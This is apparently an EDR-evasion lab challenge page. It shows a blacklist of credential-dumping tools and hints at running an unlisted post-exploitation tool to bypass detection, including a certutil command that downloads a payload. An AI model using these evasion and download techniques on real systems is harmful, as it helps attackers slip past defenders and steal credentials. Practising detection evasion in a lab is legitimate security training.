---
title: "Challenge 04: Unlisted Tool"
difficulty: easy
category: "Process Name Evasion"
target_rule: 1
---

## Objective

Use a credential dumping or post-exploitation tool that is not in the EDR's blacklist.

## Scanner Behavior

The blacklist contains exactly 12 tool names. Any tool not in this list passes Rule 1 entirely.

```nim
const BlacklistedProcesses = [
  "mimikatz.exe", "procdump.exe", "procdump64.exe",
  "dumpert.exe", "nanodump.exe", "rubeus.exe",
  "seatbelt.exe", "sharphound.exe", "lazagne.exe",
  "safetykatz.exe", "bloodhound.exe", "notepad.exe"
]
```

## Rules

- Use a real post-exploitation tool not in the list above
- The tool must perform actual offensive operations (recon, credential access, etc.)
- The EDR must not trigger Rule 1

## Hints

<details class="hint-box"><summary>Hint 1</summary>
Look at the blacklist carefully. Which popular tools are missing?
</details>

<details class="hint-box"><summary>Hint 2</summary>
Think about: Certutil, CrackMapExec, Impacket, PowerView, SharpHound...
</details>

<details class="hint-box"><summary>Hint 3</summary>
<code>certutil.exe -urlcache -split -f http://... payload.exe</code> - certutil is not blacklisted.
</details>
